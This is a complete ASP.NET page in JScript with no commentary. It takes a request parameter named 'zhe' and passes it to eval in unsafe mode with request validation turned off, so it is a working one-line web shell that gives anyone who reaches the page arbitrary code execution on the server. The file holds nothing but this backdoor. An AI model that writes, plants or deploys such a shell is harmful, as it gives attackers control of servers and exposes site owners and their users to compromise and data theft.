<%@ Page Language="Jscript" validateRequest="false" %>
<%
var keng
keng = Request.Item["zhe"];
Response.Write(eval(keng,"unsafe"));
%>